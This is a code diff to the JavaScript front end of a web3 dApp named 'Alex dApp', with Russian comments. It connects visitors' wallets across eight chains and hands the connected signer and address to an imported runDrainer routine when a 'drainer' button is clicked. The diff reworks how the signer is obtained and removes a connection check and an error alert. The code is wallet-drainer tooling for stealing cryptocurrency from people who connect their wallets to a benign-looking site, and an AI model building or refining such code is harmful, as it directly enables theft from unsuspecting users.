@@ -14,9 +14,23 @@ import { ethers } from 'ethers'
 import { runDrainer } from './drainer.js'
 
 const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
-const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
 
-const wagmiAdapter = new WagmiAdapter({ projectId, networks })
+// ✅ Все поддерживаемые сети
+const networks = [
+  mainnet,
+  polygon,
+  bsc,
+  avalanche,
+  arbitrum,
+  optimism,
+  linea,
+  base
+]
+
+const wagmiAdapter = new WagmiAdapter({
+  projectId,
+  networks
+})
 
 const metadata = {
   name: 'Alex dApp',
@@ -35,39 +49,18 @@ const modal = createAppKit({
   }
 })
 
-let signer = null
-let address = null
-
-// После подключения — получаем signer и включаем кнопку
-modal.on('connect', async () => {
-  try {
-    const provider = new ethers.BrowserProvider(window.ethereum, 'any')
-    signer = await provider.getSigner()
-    address = await signer.getAddress()
-
-    document.getElementById('status').textContent = `✅ Подключено: ${address}`
-    document.getElementById('drainer-btn').disabled = false
-  } catch (e) {
-    console.error('Ошибка при получении signer:', e)
-  }
-})
-
-// Открыть модальное окно для подключения
-document.getElementById('open-connect-modal').addEventListener('click', () => {
-  modal.open()
-})
+// Открыть модалку по клику
+document.getElementById('open-connect-modal').addEventListener('click', () => modal.open())
 
 // Запуск drainer-а
 document.getElementById('drainer-btn').addEventListener('click', async () => {
-  if (!signer || !address) {
-    alert('Сначала подключите кошелёк!')
-    return
-  }
-
   try {
-    await runDrainer(signer.provider, signer, address)
+    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
+    const signer = provider.getSigner()
+    const address = await signer.getAddress()
+
+    await runDrainer(provider, signer, address)
   } catch (e) {
     console.error("Ошибка в Drainer:", e)
-    alert("Ошибка при вызове контракта: " + e.message)
   }
 })
